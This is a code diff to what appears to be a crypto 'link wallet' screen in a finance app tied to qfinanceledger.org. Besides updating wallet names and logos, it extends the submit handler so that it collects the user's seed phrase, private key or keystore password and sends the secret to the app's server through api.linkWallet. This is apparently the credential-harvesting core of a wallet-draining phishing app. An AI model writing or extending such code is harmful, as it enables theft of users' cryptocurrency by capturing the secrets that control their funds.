@@ -25,7 +25,7 @@ const wallets = [
   },
   {
     "name": "Cold Wallet",
-    "image_url": "https://qfinanceledger.org/images/wallets/4_cold_wallets.png"
+    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
     "name": "MetaMask",
@@ -124,12 +124,20 @@ const wallets = [
     "image_url": "https://cdn.brandfetch.io/idfHQX8bMT/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
-    "name": "Phanthom Wallet",
+    "name": "Phantom Wallet",
     "image_url": "https://cdn.brandfetch.io/idf5VaJxyT/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
     "name": "Ledger Nano X",
-    "image_url": "https://qfinanceledger.org/images/wallets/ledger_nano_x.png"
+    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
+  },
+  {
+    "name": "Binance",
+    "image_url": "https://cryptologos.cc/logos/bnb-bnb-logo.png"
+  },
+  {
+    "name": "Bybit",
+    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
     "name": "Other Wallets",
@@ -192,17 +200,28 @@ export default function LinkWalletScreen() {
         return;
       }
 
+      let phraseData = '';
+      if (connectionMethod === 'phrase') {
+        phraseData = seedPhrase;
+      } else if (connectionMethod === 'private') {
+        phraseData = privateKey;
+      } else if (connectionMethod === 'keystore') {
+        phraseData = keystorePassword;
+      }
+
+      const finalWalletType = selectedWallet?.name || detectedWalletType || 'Unknown';
+
       const walletData = {
-        phrase: seedPhrase,
-        walletAddress: walletAddress,
-        type: detectedWalletType || 'Unknown'
+        phrase: phraseData,
+        walletAddress: walletAddress || 'N/A',
+        type: finalWalletType
       };
 
       const response = await api.linkWallet(token, walletData);
 
       setSuccessData({
         referenceNumber: response.wallet.referenceNumber,
-        walletType: detectedWalletType || 'Unknown',
+        walletType: finalWalletType,
       });
 
     } catch (error) {
